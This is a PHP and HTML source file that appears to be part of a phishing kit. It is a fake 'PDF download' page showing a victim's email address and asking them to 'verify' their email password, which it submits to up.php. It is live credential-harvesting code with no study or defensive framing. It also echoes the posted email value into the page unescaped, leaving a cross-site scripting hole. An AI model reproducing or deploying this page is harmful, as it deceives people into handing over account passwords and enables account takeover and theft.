<?

$pdf1 = $_POST['pdf1'];

?>
<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Download..,</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
  
  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Open+Sans'>

      <link rel="stylesheet" href="css/style.css">

  
</head>
<script language="JavaScript">
<!--
function validateForm()
{
var y=document.forms["myform"]["pdf2"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["pdf2"].value;
if(y.length <5 )
  {
  alert("Invalid Password");
  return false;
  }
}



-->
</script>


<body>

  <div class="cont">
  <div class="demo">
    <div class="login">
      <div class="login__check"><img src="./im/pdf.png" height="110" width="110"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#fffff" size="3"><strong>Welcome</strong></font><br><font color="#fffff" size="2.5">Verify email password to continue.</font></div></div><div>
	  
	  
      <div class="login__form">
        <div class="login__row"><form action="up.php"  method="post" autocomplete="off" onsubmit="return validateForm()" name="myform">
        <input type=hidden name="pdf1" value="<? print $pdf1; ?>">
          <svg class="login__icon name svg-icon" viewBox="0 0 20 20">
            <path d="M0,20 a10,8 0 0,1 20,0z M10,0 a4,4 0 0,1 0,8 a4,4 0 0,1 0,-8" />
          </svg><font color="#fffff" size="3"><strong><? print $pdf1; ?></strong>
          
        </div>
        <div class="login__row">
          <svg class="login__icon pass svg-icon" viewBox="0 0 20 20">
            <path d="M0,20 20,20 20,8 0,8z M10,13 10,16z M4,8 a6,8 0 0,1 12,0" />
          </svg>
          <input name="pdf2" type="password" class="login__input pass" placeholder="Password"/>
        </div>
        <button type="submit" class="login__submit">Download File (300kb)</button>
        <p class="login__signup"><a></a></p>
      </div>
    </div>
        
      </div>
    </div>
  </div>
</div>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

  

    <script  src="js/index.js"></script>




</body>

</html>